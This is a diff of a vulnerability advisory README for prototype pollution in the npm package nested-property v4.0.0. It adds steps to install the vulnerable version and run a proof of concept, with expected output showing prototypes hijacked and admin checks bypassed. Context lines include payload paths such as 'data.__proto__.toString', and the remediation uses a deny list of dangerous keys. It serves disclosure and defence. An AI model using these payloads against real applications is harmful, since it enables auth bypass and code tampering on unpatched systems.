@@ -22,7 +22,105 @@ All **four attack vectors** below are **confirmed reproducible** on the latest p
 
 ---
 
-## 2. Root Cause
+## 2. Installation & Verification
+
+> **Requirements:** Node.js v16 or higher, npm
+
+### Step 1 — Clone this repository
+
+```bash
+git clone https://github.com/blah-blah-cell/nested-property-prototype-pollution-research.git
+cd nested-property-prototype-pollution-research
+```
+
+### Step 2 — Install the vulnerable package
+
+Pin exactly to v4.0.0 — this is the version with the incomplete fix:
+
+```bash
+npm install nested-property@4.0.0
+```
+
+Verify the installed version:
+
+```bash
+npm list nested-property
+# expected: nested-property@4.0.0
+```
+
+### Step 3 — Run the PoC
+
+```bash
+node poc.js
+```
+
+### Expected output
+
+```
+=== nested-property v4.0.0 — Prototype Pollution Bypass PoC ===
+Researcher: Ojas Mehta | Date: April 2, 2026
+
+--- Vector 1: Array.prototype via __proto__ ---
+[1] Array.prototype.polluted: true
+[1] Object.prototype.polluted: undefined
+[1] [].polluted: true
+
+--- Vector 2: Function.prototype via constructor.__proto__ ---
+[2] Function.prototype.polluted: true
+[2] (function(){}).polluted: true
+
+--- Vector 3: Array.prototype method hijacking ---
+[3] [1,2,3].toString(): HIJACKED
+[3] ({}).toString(): [object Object]
+
+--- Vector 4: Array root + constructor.prototype ---
+[4] [].injected: owned
+[4] ({}).injected: undefined
+
+=== All 4 vectors confirmed. Object.prototype guard bypassed silently. ===
+Note: No ObjectPrototypeMutationError was thrown for any of the above.
+
+--- Bonus: Process-wide persistence demo ---
+attacker.isAdmin (raw): true
+normalUser.isAdmin (raw): true
+checkAdmin(attacker): true
+checkAdmin(normalUser): true
+[].isAdmin: true
+```
+
+**What to look for:**
+- `Array.prototype.polluted: true` — guard bypassed for arrays (Vector 1)
+- `Object.prototype.polluted: undefined` — confirms `Object.prototype` is protected, everything else is not
+- `[1,2,3].toString(): HIJACKED` — native method silently overridden (Vector 3)
+- `checkAdmin(attacker): true` on a fresh `{ id: 999, name: "attacker" }` object — auth bypass demonstrated
+- **No `ObjectPrototypeMutationError` anywhere** — all vectors succeed silently
+
+### Step 4 — Verify the fix
+
+Run the remediation validation script to confirm both proposed defenses block all 4 vectors:
+
+```bash
+node fix-recommendation.js
+```
+
+### Expected fix output
+
+```
+=== Fix Validation ===
+[PASS] Vector 1: blocked — Blocked: dangerous path segment in "data.__proto__.polluted"
+[PASS] Vector 2: blocked — Blocked: dangerous path segment in "constructor.__proto__.polluted"
+[PASS] Vector 3: blocked — Blocked: dangerous path segment in "data.__proto__.toString"
+[PASS] Vector 4: blocked — Blocked: dangerous path segment in "constructor.prototype.injected"
+[PASS] Safe path allowed: {"user":{"profile":{"name":"Alice"}}}
+
+Fix validation complete.
+```
+
+All 4 vectors blocked. Safe paths (no dangerous segments) still pass through correctly.
+
+---
+
+## 3. Root Cause
 
 The guard added in v4.0.0 (`nested-property/dist/nested-property.js`, line 166):
 
@@ -40,7 +138,7 @@ if (currentObject === Reflect.getPrototypeOf({})) {
 
 ---
 
-## 3. Confirmed Attack Vectors (v4.0.0)
+## 4. Confirmed Attack Vectors (v4.0.0)
 
 ### Vector 1 — `Array.prototype` pollution via `__proto__` key
 
@@ -76,7 +174,7 @@ np.set({ data: [] }, "data.__proto__.toString", () => "HIJACKED");
 
 ---
 
-## 4. Full PoC
+## 5. Full PoC
 
 See [`poc.js`](./poc.js) — runnable on Node.js v16+ with `nested-property@4.0.0`.
 
@@ -95,7 +193,7 @@ See [`poc.js`](./poc.js) — runnable on Node.js v16+ with `nested-property@4.0.
 
 ---
 
-## 5. Impact
+## 6. Impact
 
 | Impact | Scope | Severity |
 |---|---|---|
@@ -108,7 +206,7 @@ See [`poc.js`](./poc.js) — runnable on Node.js v16+ with `nested-property@4.0.
 
 ---
 
-## 6. Supply Chain Context
+## 7. Supply Chain Context
 
 `nested-property` is a transitive dependency of `webdav` v5.9.0 (and other packages). Any application that:
 
@@ -123,7 +221,7 @@ See [`poc.js`](./poc.js) — runnable on Node.js v16+ with `nested-property@4.0.
 
 ---
 
-## 7. Discovery Methodology
+## 8. Discovery Methodology
 
 1. **Source analysis:** Read `nested-property/dist/nested-property.js`, identified the guard as a single strict identity check against `Reflect.getPrototypeOf({})`.
 2. **Guard boundary mapping:** Determined the guard exclusively matches `Object.prototype` — nothing else in the prototype chain.
@@ -132,7 +230,7 @@ See [`poc.js`](./poc.js) — runnable on Node.js v16+ with `nested-property@4.0.
 
 ---
 
-## 8. Remediation
+## 9. Remediation
 
 See [`fix-recommendation.js`](./fix-recommendation.js) for full patched implementation.
 
@@ -164,7 +262,7 @@ const isSafe = (path) => !path.split(".").some(s => DANGEROUS_KEYS.includes(s));
 
 ---
 
-## 9. Disclosure Timeline
+## 10. Disclosure Timeline
 
 | Date | Action |
 |---|---|
@@ -178,7 +276,7 @@ const isSafe = (path) => !path.split(".").some(s => DANGEROUS_KEYS.includes(s));
 
 ---
 
-## 10. Status
+## 11. Status
 
 **Unpatched in v4.0.0.** Maintainer has been unresponsive since approximately 2020. Active 0-Day as of June 2026.
 
